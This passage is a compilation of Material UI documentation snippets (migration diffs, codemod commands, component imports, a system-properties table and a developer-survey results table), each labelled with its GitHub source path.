https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_72\n\nLANGUAGE: diff\nCODE:\n```\n-<Button color=\"default\">\n+<Button>\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/button-color-prop <path>\n```\n\n----------------------------------------\n\nTITLE: Mapping MUI System Props to CSS and Theme Values (Markdown)\nDESCRIPTION: This Markdown table provides a comprehensive mapping between Material UI System properties (used as props on MUI components), the CSS properties they control, links to the relevant MUI System documentation pages, and the path to corresponding values within the MUI theme object. It covers properties related to palette (colors), positions, sizing, and spacing, serving as a reference for translating system props to styles and leveraging theme customization.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/properties/properties.md#2025-04-22_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n| `bgcolor`             | `background-color`                                                                           | [`bgcolor`](/system/palette/#background-color)               | [`theme.palette[value]`](/material-ui/customization/default-theme/?expand-path=$.palette)           |\n| `color`               | `color`                                                                                      | [`color`](/system/palette/#color)                            | [`theme.palette[value]`](/material-ui/customization/default-theme/?expand-path=$.palette)           |\n| `bottom`              | `bottom`                                                                                     | [`bottom`](/system/positions/)                               | none                                                                                                |\n| `left`                | `left`                                                                                       | [`left`](/system/positions/)                                 | none                                                                                                |\n| `position`            | `position`                                                                                   | [`position`](/system/positions/)                             | none                                                                                                |\n| `right`               | `right`                                                                                      | [`right`](/system/positions/)                                | none                                                                                                |\n| `top`                 | `top`                                                                                        | [`top`](/system/positions/)                                  | none                                                                                                |\n| `zIndex`              | `z-index`                                                                                    | [`zIndex`](/system/positions/#z-index)                       | [`theme.zIndex[value]`](/material-ui/customization/default-theme/?expand-path=$.zIndex)             |\n| `height`              | `height`                                                                                     | [`height`](/system/sizing/#height)                           | none                                                                                                |\n| `maxHeight`           | `max-height`                                                                                 | [`maxHeight`](/system/sizing/)                               | none                                                                                                |\n| `maxWidth`            | `max-width`                                                                                  | [`maxWidth`](/system/sizing/)                                | none                                                                                                |\n| `minHeight`           | `min-height`                                                                                 | [`minHeight`](/system/sizing/)                               | none                                                                                                |\n| `minWidth`            | `min-width`                                                                                  | [`minWidth`](/system/sizing/)                                | none                                                                                                |\n| `width`               | `width`                                                                                      | [`width`](/system/sizing/#width)                             | none                                                                                                |\n| `boxSizing`           | `box-sizing`                                                                                 | [`boxSizing`](/system/sizing/)                               | none                                                                                                |\n| `m`, `margin`         | `margin`                                                                                     | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `mb`, `marginBottom`  | `margin-bottom`                                                                              | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `ml`, `marginLeft`    | `margin-left`                                                                                | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `mr`, `marginRight`   | `margin-right`                                                                               | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `mt`, `marginTop`     | `margin-top`                                                                                 | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `mx`, `marginX`       | `margin-left`, `margin-right`                                                                | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `my`, `marginY`       | `margin-top`, `margin-bottom`                                                                | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `marginInline`        | `margin-inline`                                                                              | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `marginInlineStart`   | `margin-inline-start`                                                                        | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `marginInlineEnd`     | `margin-inline-end`                                                                          | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `marginBlock`         | `margin-block`                                                                               | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `marginBlockStart`    | `margin-block-start`                                                                         | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `marginBlockEnd`      | `margin-block-end`                                                                           | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `p`, `padding`        | `padding`                                                                                    | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `pb`, `paddingBottom` | `padding-bottom`                                                                             | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `pl`, `paddingLeft`   | `padding-left`                                                                               | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `pr`, `paddingRight`  | `padding-right`                                                                              | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `pt`, `paddingTop`    | `padding-top`                                                                                | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n| `px`, `paddingX`      | `padding-left`, `padding-right`                                                              | [`spacing`](/system/spacing/)                                | [`theme.spacing(value)`](/material-ui/customization/default-theme/?expand-path=$.spacing)           |\n```\n\n----------------------------------------\n\nTITLE: Implementing Fixed Container in React MUI\nDESCRIPTION: Creates a fixed-width container where the max-width matches the min-width of the current breakpoint. Useful for designs targeting specific viewport sizes rather than fluid layouts.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/components/container/container.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Container fixed>\n```\n\n----------------------------------------\n\nTITLE: Importing Multiple Material UI Components with ES Module Destructuring in JavaScript\nDESCRIPTION: This snippet demonstrates how to use destructured imports to include multiple Material UI components in a single ES module import statement. This approach improves developer experience and enables better tree shaking for smaller bundle sizes. Ensure your environment supports ES modules and install @mui/material as a dependency.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/material-ui-v4-is-out.md#2025-04-22_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport {\n  Table\n  TableBody,\n  TableCell,\n  TableHead,\n  TableRow,\n  Paper,\n} from '@mui/material';\n```\n\n----------------------------------------\n\nTITLE: Defining a Feature List using Custom HTML Tag\nDESCRIPTION: This snippet demonstrates the use of a custom HTML tag '<featureList>' to create a formatted list of features within the documentation. The content inside the tag, typically list items, describes the features. This relies on the documentation system's custom parser to recognize and render the '<featureList>' element appropriately.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/experiments/docs/custom-components.md#2025-04-22_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<featureList>\n- Manages modal stacking when one-at-a-time just isn't enough.\n- Creates a backdrop, for disabling interaction below the modal.est\n- It disables scrolling of the page content while open.\n- It properly manages focus; moving to the modal content, and keeping it there until the modal is closed.\n- Adds the appropriate ARIA roles automatically.\n</featureList>\n```\n\n----------------------------------------\n\nTITLE: Updating ref forwarding in custom TextField input component\nDESCRIPTION: Changes ref forwarding expectations on custom inputComponent for TextField, using the ref prop instead of inputRef.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_39\n\nLANGUAGE: diff\nCODE:\n```\n-function NumberFormatCustom(props) {\n-  const { inputRef, onChange, ...other } = props;\n+const NumberFormatCustom = React.forwardRef(function NumberFormatCustom(\n+  props,\n+  ref,\n+) {\n  const { onChange, ...other } = props;\n\n  return (\n    <NumberFormat\n      {...other}\n-     getInputRef={inputRef}\n+     getInputRef={ref}\n```\n\n----------------------------------------\n\nTITLE: Removing Default Button Color\nDESCRIPTION: Updates Button component by removing 'default' color prop since 'primary' is now the default color.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_5\n\nLANGUAGE: diff\nCODE:\n```\n-<Button color=\"default\">\n+<Button>\n```\n\n----------------------------------------\n\nTITLE: Updating styled Box Components in Material UI v6\nDESCRIPTION: Changes needed when using styled with Box components due to type changes in v6, either by switching to div elements or using type casting.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/upgrade-to-v6.md#2025-04-22_snippet_21\n\nLANGUAGE: diff\nCODE:\n```\n-const StyledBox = styled(Box)`\n+const StyledDiv = styled('div')`\n   color: white;\n `;\n```\n\n----------------------------------------\n\nTITLE: Updating Theme Breakpoint Logic\nDESCRIPTION: Modifies theme breakpoint values to align with new breakpoint logic in v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_115\n\nLANGUAGE: diff\nCODE:\n```\n-theme.breakpoints.down('sm')\n-theme.breakpoints.between('sm', 'md')\n+theme.breakpoints.down('md')\n+theme.breakpoints.between('sm', 'lg')\n```\n\n----------------------------------------\n\nTITLE: Importing AspectRatio Component - React/JSX\nDESCRIPTION: Basic import statement for the AspectRatio component from Joy UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/aspect-ratio/aspect-ratio.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport AspectRatio from '@mui/joy/AspectRatio';\n```\n\n----------------------------------------\n\nTITLE: Updating Tooltip interactivity in React\nDESCRIPTION: Changes Tooltip to be interactive by default and renames the prop to disableInteractive to reflect the new default behavior.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_45\n\nLANGUAGE: diff\nCODE:\n```\n-<Tooltip>\n+<Tooltip disableInteractive>\n\n # Interactive tooltips no longer need the `interactive` prop.\n-<Tooltip interactive>\n+<Tooltip>\n```\n\n----------------------------------------\n\nTITLE: MUI System Properties Documentation Header\nDESCRIPTION: Markdown header and description section introducing the MUI System properties API documentation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/properties/properties.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n# Properties\n\n<p class=\"description\">This API page lists all the custom MUI System properties, how they are linked with the theme, and which CSS properties they compute.</p>\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Styling Overrides in Material-UI Theme\nDESCRIPTION: Changes the method for overriding Grid styles in the theme, using a callback function instead of direct class overrides.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_17\n\nLANGUAGE: diff\nCODE:\n```\n const theme = createTheme({\n   components: {\n     MuiGrid: {\n-      styleOverrides: {\n-        'align-items-xs-flex-end': {\n-          marginTop: 20,\n-        },\n-      },\n+      styleOverrides: ({ ownerState }) => ({\n+        ...ownerState.alignItems === 'flex-end' && {\n+          marginTop: 20,\n+        },\n+      }),\n     },\n   },\n });\n```\n\n----------------------------------------\n\nTITLE: Importing Radio Component in React\nDESCRIPTION: Basic import statement for the Radio component from Joy UI package.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/radio-button/radio-button.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Radio from '@mui/joy/Radio';\n```\n\n----------------------------------------\n\nTITLE: Using CSS color-mix Function for Runtime Calculations\nDESCRIPTION: Shows how to perform runtime color calculations using CSS functions like color-mix instead of JavaScript. This approach is recommended for operations like adjusting color transparency.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\nconst Custom = styled('div')(({ theme }) => ({\n  color: `color-mix(in srgb, ${theme.vars.palette.text.primary}, transparent 50%)`,\n}));\n```\n\n----------------------------------------\n\nTITLE: Change in Default theme.palette.warning Colors\nDESCRIPTION: Diff showing the updated default warning color palette to meet AA accessibility standards in both light and dark modes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_16\n\nLANGUAGE: diff\nCODE:\n```\n  warning = {\n-  main: orange[500],\n+  main: '#ED6C02', // orange[400] in \"dark\" mode\n\n-  light: orange[300],\n+  light: orange[500], // orange[300] in \"dark\" mode\n\n-  dark: orange[700],\n+  dark: orange[900], // orange[700] in \"dark\" mode\n  }\n```\n\n----------------------------------------\n\nTITLE: Generic Component Prop Renaming in React\nDESCRIPTION: A generic codemod to rename any component prop. This versatile codemod can be used to update prop names across various components when migrating to Material-UI v5.\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_76\n\nLANGUAGE: diff\nCODE:\n```\n-<Component prop=\"value\" />\n-<Component prop />\n+<Component newProp=\"value\" />\n+<Component newProp />\n```\n\nLANGUAGE: bash\nCODE:\n```\nnpx @mui/codemod@latest v5.0.0/component-rename-prop <path> -- --component=Grid --from=prop --to=newProp\n```\n\n----------------------------------------\n\nTITLE: Installing Marketing Page Template Dependencies\nDESCRIPTION: List of required dependencies and installation steps for implementing the MUI marketing page template in a project. Dependencies include Material-UI core components, icons, and Emotion styling libraries.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/templates/marketing-page/README.md#2025-04-22_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n@mui/material\n@mui/icons-material\n@emotion/styled\n@emotion/react\n```\n\n----------------------------------------\n\nTITLE: Responsive Grid with Multiple Breakpoints\nDESCRIPTION: Grid implementation with responsive behavior that changes layout at defined breakpoints, using size props that vary by viewport width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"FullWidthGrid.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Installing Material UI Next.js Dependencies with pnpm\nDESCRIPTION: Command to install the required dependencies for integrating Material UI with Next.js App Router using pnpm package manager.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/material-nextjs @emotion/cache\n```\n\n----------------------------------------\n\nTITLE: Grid Component Props Update for v7.0.0\nDESCRIPTION: Transforms Grid component props to use new size and offset prop structure, supporting custom breakpoints\nSOURCE: https://github.com/mui/material-ui/blob/master/packages/mui-codemod/README.md#2025-04-22_snippet_62\n\nLANGUAGE: diff\nCODE:\n```\n<Grid\n-   xs={12}\n-   sm={6}\n-   xsOffset={2}\n-   smOffset={3}\n+   size={{ xs: 12, sm: 6 }}\n+   offset={{ xs: 2, sm: 3 }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Importing Portal Component from MUI Base\nDESCRIPTION: Demonstrates importing the Portal component from @mui/base. This component allows rendering children into a different DOM node.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { Portal } from '@mui/base/Portal';\n```\n\n----------------------------------------\n\nTITLE: Updating OutlinedInput Label Prop in React\nDESCRIPTION: Replaces the labelWidth prop with a label prop in OutlinedInput components.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_23\n\nLANGUAGE: diff\nCODE:\n```\n-<OutlinedInput labelWidth={20} />\n+<OutlinedInput label=\"First Name\" />\n```\n\n----------------------------------------\n\nTITLE: Migrating Circular Progress from v0.x to v1.x\nDESCRIPTION: Shows the changes needed to migrate Circular Progress components from Material-UI v0.x to v1.x with updated prop names.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v0x/migration-v0x.md#2025-04-22_snippet_11\n\nLANGUAGE: diff\nCODE:\n```\n-import CircularProgress from 'material-ui/CircularProgress';\n+import CircularProgress from '@material-ui/core/CircularProgress';\n\n-<CircularProgress mode=\"indeterminate\" />\n+<CircularProgress variant=\"indeterminate\" />\n```\n\n----------------------------------------\n\nTITLE: Structuring Material UI Feedback Data in an HTML Table\nDESCRIPTION: An HTML `<table>` used to display categorized user feedback for Material UI improvements. Each main category (e.g., 'more components', 'customization') is presented as a header row (`th`), followed by specific suggestions and their mention counts in subsequent data rows (`td`). Inline styling is used on the first header (`th`) to set its width.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2020-developer-survey-results.md#2025-04-22_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<table>\n  <tr><th style=\"width: 40px;\">306</th><th style=\"width: 700px;\">more components</th><tr>\n  <tr><td>202</td><td>more components - ?</td><tr>\n  <tr><td>15</td><td>more components - data grid</td><tr>\n  <tr><td>12</td><td>more components - carousel</td><tr>\n  <tr><td>12</td><td>more components - charts</td><tr>\n  <tr><td>10</td><td>more components - lab to core</td><tr>\n  <tr><td>10</td><td>more components - upload</td><tr>\n  <tr><td>9</td><td>more components - icons</td><tr>\n  <tr><td>6</td><td>more components - big calendar</td><tr>\n  <tr><td>5</td><td>more components - layout</td><tr>\n  <tr><td>4</td><td>more components - navbar</td><tr>\n  <tr><td>4</td><td>more components - nested menu</td><tr>\n  <tr><td>2</td><td>more components - rich text editor</td><tr>\n  <tr><td>2</td><td>more components - splitter</td><tr>\n  <tr><td>1</td><td>more components - masonry</td><tr>\n  <tr><td>1</td><td>more components - nav bar</td><tr>\n  <tr><td>1</td><td>more components - numberpad</td><tr>\n  <tr><td>1</td><td>more components - onboarding</td><tr>\n  <tr><td>1</td><td>more components - prompt</td><tr>\n  <tr><td>1</td><td>more components - scrollspy</td><tr>\n  <tr><td>1</td><td>more components - swappable tabs</td><tr>\n  <tr><td>1</td><td>more components - timeline</td><tr>\n  <tr><td>1</td><td>more components - video player</td><tr>\n  <tr><td>1</td><td>more components - virtualization</td><tr>\n  <tr><td>1</td><td>more components - drag and drop</td><tr>\n  <tr><td>1</td><td>more components - dropdown</td><tr>\n  <tr><td>1</td><td>more components - image</td><tr>\n  <tr><th>189</th><th>customization</th><tr>\n  <tr><td>85</td><td>customization - easier</td><tr>\n  <tr><td>22</td><td>customization - docs</td><tr>\n  <tr><td>16</td><td>customization - dynamic color & variant</td><tr>\n  <tr><td>15</td><td>customization - improve custom themes</td><tr>\n  <tr><td>13</td><td>customization - provide more themes (not just Material Design)</td><tr>\n  <tr><td>11</td><td>customization - ?</td><tr>\n  <tr><td>9</td><td>customization - unstyled components</td><tr>\n  <tr><td>8</td><td>customization - support system in all components</td><tr>\n  <tr><td>8</td><td>customization - theme editor (visual tool)</td><tr>\n  <tr><td>2</td><td>customization - theme gallery (coming from the community)</td><tr>\n  <tr><th>155</th><th>docs</th><tr>\n  <tr><td>46</td><td>docs - ?</td><tr>\n  <tr><td>45</td><td>docs - more examples</td><tr>\n  <tr><td>33</td><td>docs - more templates</td><tr>\n  <tr><td>16</td><td>docs - beginner friendly</td><tr>\n  <tr><td>8</td><td>docs - smaller demos</td><tr>\n  <tr><td>8</td><td>docs - tutorials</td><tr>\n  <tr><td>3</td><td>docs - api integration with components</td><tr>\n  <tr><td>2</td><td>docs - better search</td><tr>\n  <tr><td>2</td><td>docs - spanish</td><tr>\n  <tr><td>1</td><td>docs - chinese</td><tr>\n  <tr><td>1</td><td>docs - translations</td><tr>\n  <tr><td>1</td><td>docs - detailed api</td><tr>\n  <tr><td>1</td><td>docs - easier discoverability of components</td><tr>\n  <tr><td>1</td><td>docs - generated DOM</td><tr>\n  <tr><td>1</td><td>docs - japanese</td><tr>\n  <tr><td>1</td><td>docs - more realistic examples</td><tr>\n  <tr><td>1</td><td>docs - nested props</td><tr>\n  <tr><td>1</td><td>docs - plugins</td><tr>\n  <tr><td>1</td><td>docs - ssr</td><tr>\n  <tr><th>64</th><th>performance</th><tr>\n  <tr><td>31</td><td>performance - ?</td><tr>\n  <tr><td>32</td><td>performance - bundle size</td><tr>\n  <tr><td>1</td><td>performance - DOM size</td><tr>\n  <tr><th>56</th><th>styles</th><tr>\n  <tr><td>19</td><td>styles - styled components</td><tr>\n  <tr><td>7</td><td>styles - docs</td><tr>\n  <tr><td>5</td><td>styles - simpler</td><tr>\n  <tr><td>4</td><td>styles - ?</td><tr>\n  <tr><td>3</td><td>styles - CSS syntax</td><tr>\n  <tr><td>3</td><td>styles - better dark/light switch</td><tr>\n  <tr><td>3</td><td>styles - emotion</td><tr>\n  <tr><td>3</td><td>styles - performance</td><tr>\n  <tr><td>2</td><td>styles - agnostic to engine</td><tr>\n  <tr><td>2</td><td>styles - CSS modules</td><tr>\n  <tr><td>2</td><td>styles - utility class names</td><tr>\n  <tr><td>1</td><td>styles - atomic compiled CSS-in-JS</td><tr>\n  <tr><td>1</td><td>styles - keep jss</td><tr>\n  <tr><td>1</td><td>styles - remove JSS</td><tr>\n  <tr><th>25</th><th>typescript</th><tr>\n  <tr><td>19</td><td>typescript - ?</td><tr>\n  <tr><td>3</td><td>typescript - docs</td><tr>\n  <tr><td>3</td><td>typescript - faster check</td><tr>\n  <tr><th>21</th><th>date picker - improve</th><tr>\n  <tr><th>19</th><th>react native</th><tr>\n  <tr><th>13</th><th>form</th><tr>\n  <tr><th>13</th><th>material design updates</th><tr>\n  <tr><th>12</th><th>animations</th><tr>\n  <tr><td>8</td><td>animations - ?</td><tr>\n  <tr><td>2</td><td>animations - docs</td><tr>\n  <tr><td>1</td><td>animations - declarative API</td><tr>\n  <tr><td>1</td><td>animations - SVG</td><tr>\n  <tr><th>11</th><th>test</th><tr>\n  <tr><td>4</td><td>test - jest</td><tr>\n  <tr><td>3</td><td>test - stable snapshot</td><tr>\n  <tr><td>1</td><td>test - ?</td><tr>\n  <tr><td>1</td><td>test - docs</td><tr>\n  <tr><td>1</td><td>test - styles</td><tr>\n  <tr><td>1</td><td>test - testing library integration</td><tr>\n  <tr><th>8</th><th>more opinionated</th><tr>\n  <tr><th>8</th><th>simplify</th><tr>\n  <tr><th>7</th><th>class components</th><tr>\n  <tr><th>7</th><th>mobile</th><tr>\n  <tr><th>7</th><th>fewer breaking changes</th><tr>\n  <tr><th>7</th><th>designers</th><tr>\n  <tr><td>2</td><td>designers - bridge design tools and code</td><tr>\n  <tr><td>2</td><td>designers - Adobe XD material</td><tr>\n  <tr><td>2</td><td>designers - Figma material</td><tr>\n  <tr><td>1</td><td>designers - ?</td><tr>\n  <tr><th>6</th><th>free vs paid balance</th><tr>\n  <tr><th>6</th><th>tree view - improve</th><tr>\n  <tr><th>6</th><th>less abstracted components</th><tr>\n  <tr><th>5</th><th>more abstracted components</th><tr>\n  <tr><th>4</th><th>accessibility</th><tr>\n  <tr><td>1</td><td>accessibility - ?</td><tr>\n  <tr><td>1</td><td>accessibility - auto id</td><tr>\n  <tr><td>1</td><td>accessibility - full audit</td><tr>\n  <tr><td>1</td><td>accessibility - more examples</td><tr>\n  <tr><th>4</th><th>system</th><tr>\n  <tr><td>1</td><td>system - CSS grid</td><tr>\n  <tr><td>1</td><td>system - docs</td><tr>\n  <tr><td>1</td><td>system - performance</td><tr>\n  <tr><td>1</td><td>system - rework breakpoints</td><tr>\n  <tr><th>3</th><th>components consistency</th><tr>\n  <tr><th>3</th><th>grid - improve</th><tr>\n</table>\n\n<!-- vale MUI.CorrectReferenceAllCases = YES -->\n```\n\n----------------------------------------\n\nTITLE: Interactive Grid Demo\nDESCRIPTION: An interactive demo that allows exploration of different grid settings and their visual results.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/grid/grid.md#2025-04-22_snippet_11\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"InteractiveGrid.js\", \"hideToolbar\": true, \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Updating Divider Inset Property\nDESCRIPTION: Diff showing the migration from the deprecated 'inset' prop to using the 'variant' prop with value 'inset'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v3/migration-v3.md#2025-04-22_snippet_15\n\nLANGUAGE: diff\nCODE:\n```\n-<Divider inset />\n+<Divider variant=\"inset\" />\n```\n\n----------------------------------------\n\nTITLE: Enabling Cell Selection in DataGridPremium (JSX)\nDESCRIPTION: Shows how to activate the unstable cell selection feature in the DataGridPremium component in MUI X v6. This allows users to select individual or groups of cells in a grid, similar to Excel. The key dependency is DataGridPremium with the unstable_cellSelection prop. The main parameter is unstable_cellSelection, which must be set to enable the experimental feature. Input is user selection within the grid; output is visual cell selection. This feature is unstable, may change, and requires a Premium license and the corresponding MUI X packages.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/mui-x-v6.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<DataGridPremium unstable_cellSelection />\n```\n\n----------------------------------------\n\nTITLE: Restoring Old MUI JoyChipDelete Default Props using extendTheme in JavaScript\nDESCRIPTION: Provides a theme customization snippet using `extendTheme` to restore the previous default props for the `JoyChipDelete` component. It changes the default `variant` to 'solid' and the default `color` to 'primary'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/migration/migrating-default-theme.md#2025-04-22_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\nextendTheme({\n  components: {\n    JoyChipDelete: {\n      defaultProps: {\n        variant: 'solid',\n        color: 'primary',\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Replacing Hidden Component with sx Prop (CSS Implementation)\nDESCRIPTION: Demonstrates how to replace the deprecated Hidden component (CSS implementation) with the sx prop for responsive display control.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v7/upgrade-to-v7.md#2025-04-22_snippet_18\n\nLANGUAGE: diff\nCODE:\n```\n-<Hidden implementation=\"css\" xlUp><Paper /></Hidden>\n+<Paper sx={{ display: { xl: 'none', xs: 'block' } }} />\n```\n\nLANGUAGE: diff\nCODE:\n```\n-<Hidden implementation=\"css\" mdDown><Paper /></Hidden>\n+<Paper sx={{ display: { xs: 'none', md: 'block' } }} />\n```\n\n----------------------------------------\n\nTITLE: Importing Breadcrumbs Component in React (Joy UI)\nDESCRIPTION: Basic import statement for the Breadcrumbs component from Joy UI. This is the primary component for implementing navigation breadcrumbs in a React application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/breadcrumbs/breadcrumbs.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Breadcrumbs from '@mui/joy/Breadcrumbs';\n```\n\n----------------------------------------\n\nTITLE: Using Array-Based Breakpoints in Material-UI\nDESCRIPTION: Demonstrates how to use array-based breakpoints in Material-UI. This approach is recommended for themes with a limited number of breakpoints, typically 3 or fewer.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/getting-started/usage/usage.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ width: [null, null, 300] }}>This box has a responsive width.</Box>\n```\n\n----------------------------------------\n\nTITLE: Updating InputAdornment position prop in React\nDESCRIPTION: Sets the InputAdornment position prop to 'start' or 'end' based on its usage as startAdornment or endAdornment in TextField.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-component-changes.md#2025-04-22_snippet_41\n\nLANGUAGE: diff\nCODE:\n```\n-<TextField startAdornment={<InputAdornment>kg</InputAdornment>} />\n-<TextField endAdornment={<InputAdornment>kg</InputAdornment>} />\n+<TextField startAdornment={<InputAdornment position=\"start\">kg</InputAdornment>} />\n+<TextField endAdornment={<InputAdornment position=\"end\">kg</InputAdornment>} />\n```\n\n----------------------------------------\n\nTITLE: Custom Pagination Options Configuration in React Table\nDESCRIPTION: Examples of configuring custom pagination options for TablePagination component using both number arrays and object arrays with labels.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/table/table.md#2025-04-22_snippet_0\n\nLANGUAGE: JSX\nCODE:\n```\n<TablePagination rowsPerPageOptions={[10, 50]} />\n```\n\nLANGUAGE: JSX\nCODE:\n```\n<TablePagination rowsPerPageOptions={[10, 50, { value: -1, label: 'All' }]} />\n```\n\n----------------------------------------\n\nTITLE: Importing Border Utilities from MUI System\nDESCRIPTION: Shows how to import border utilities from the MUI System package. This is needed when using the border utilities directly rather than through the Box component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/borders/borders.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nimport { borders } from '@mui/system';\n```\n\n----------------------------------------\n\nTITLE: Replacing `innerRef` with `ref` Prop in JavaScript/JSX\nDESCRIPTION: Demonstrates replacing the `innerRef` prop with the standard `ref` prop when using components wrapped with `withStyles` in MUI v5. Refs are now automatically forwarded, making the `innerRef` prop obsolete.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_35\n\nLANGUAGE: diff\nCODE:\n```\n  import * as React from 'react';\n  import { withStyles } from '@mui/styles';\n\n  const MyComponent = withStyles({\n    root: {\n      backgroundColor: 'red',\n    },\n  })(({ classes }) => <div className={classes.root} />);\n\n  function MyOtherComponent(props) {\n    const ref = React.useRef();\n-  return <MyComponent innerRef={ref} />;\n+  return <MyComponent ref={ref} />;\n  }\n```\n\n----------------------------------------\n\nTITLE: Setting up Material UI Repository with Git\nDESCRIPTION: Commands for cloning the Material UI 